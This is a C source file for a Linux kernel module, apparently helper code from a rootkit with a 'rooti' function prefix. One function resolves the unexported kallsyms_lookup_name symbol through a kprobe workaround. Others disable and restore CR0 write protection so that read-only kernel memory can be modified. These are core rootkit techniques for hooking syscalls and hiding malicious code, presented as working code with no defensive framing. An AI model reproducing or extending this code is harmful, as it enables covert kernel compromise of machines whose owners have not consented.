#include <linux/kprobes.h>
#include <linux/string.h>
#include <asm/paravirt.h>
#include "utils.h"

unsigned long (*__kallsyms_lookup_name)(const char *name) = NULL;

/*
    Since kernel version 5.7.7 - kallsyms_lookup_name() is no longer exported to out-of-tree modules.
    We can work around this by probing the kallsyms_lookup_name() function, which will find us its
    memory address.
*/
int rooti_resolve_kln_addr(void)
{
    struct kprobe kp;
    int err;

    memset(&kp, 0, sizeof(kp));
    kp.symbol_name = "kallsyms_lookup_name";

    err = register_kprobe(&kp);
    if (err) {
        ROOTI_DEBUG("register_kprobe() failed: %d", err);
        return err;
    }
    __kallsyms_lookup_name = (unsigned long (*)(const char *name))kp.addr;
    unregister_kprobe(&kp);

    return 0;
}

inline void rooti_force_write_cr0(unsigned long val)
{
    unsigned long __force_order;
    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

inline void rooti_unprotect_memory(void)
{
    rooti_force_write_cr0(read_cr0() & (~X86_CR0_WP));
}

inline void rooti_protect_memory(void)
{
    rooti_force_write_cr0(read_cr0() | (X86_CR0_WP));
}
